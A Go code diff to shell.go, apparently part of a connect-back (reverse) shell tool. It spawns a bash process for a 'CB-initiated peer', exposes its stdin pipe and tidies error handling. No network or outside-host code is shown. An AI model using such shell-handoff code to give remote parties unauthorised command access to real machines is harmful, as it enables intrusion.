@@ -47,21 +47,19 @@ type RealShell struct {
 // Get shell for CB-initiated peer:
 func (g RealShellGetter) GetConnectBackInitiatedShell() BashShell {
 	// If bash exists on the system, find it, save the path:
-	//var bShell RealShell
 	var pointerToShell *RealShell
 
-	//bashCopPath, err := exec.LookPath(`/usr/bin/bash`) // bashPath @0xfaraday
-	// if err != nil {
-	// 	fmt.Printf("Error finding bash shell path (shell.go): %v\n", err)
-	// 	os.Stderr.WriteString(" " + err.Error() + "\n")
-	// 	os.Exit(1)
-	// }
+	bashPath, err := exec.LookPath(`/usr/bin/bash`) // bashPath @0xfaraday
+	if err != nil {
+		fmt.Printf("Error finding bash shell path (shell.go): %v\n", err)
+		os.Stderr.WriteString(" " + err.Error() + "\n")
+		os.Exit(1)
+	}
 
 	// Initiate bShell with the struct & process created by exec.Command:
-	pointerToShell = &RealShell{realShell: exec.Command("/usr/bin/bash", "-i")}
+	pointerToShell = &RealShell{realShell: exec.Command(bashPath)}
 
 	// Get the pointer to the shell process and & return it:
-	//	pointerToShell = &bShell
 	fmt.Printf("Address of shell in shell.go = %p\n", pointerToShell)
 	return pointerToShell
 }
@@ -70,10 +68,6 @@ func (g RealShellGetter) GetConnectBackInitiatedShell() BashShell {
 func (s *RealShell) StartShell() error {
 	// Start the shell:
 	var erR error = s.realShell.Start()
-	// var waitErr error = s.realShell.Wait()
-	// if waitErr != nil {
-	// 	log.Fatalf("Error calling shell.Wait() method: %v\n", waitErr)
-	// }
 
 	return erR
 }
@@ -88,10 +82,11 @@ func (s *RealShell) PipeStdin() *io.WriteCloser {
 		os.Exit(1)
 	}
 
-	// Get pointer to stdin pipe & return it:
-	var pointerToBashIn *io.WriteCloser = &bashIn
-	fmt.Printf("Stdin address (shell.go) = %p\n", pointerToBashIn)
-	return pointerToBashIn
+	// Get pointer to stdin pipe writer & return it:
+	//stdinWriter := bashIn.(io.Writer)
+	var pointerToBashInWriter *io.WriteCloser = &bashIn
+	fmt.Printf("Stdin address (shell.go) = %p\n", pointerToBashInWriter)
+	return pointerToBashInWriter
 }
 
 // Wrap the ACTUAL exec.Cmd.StdoutPipe() method:
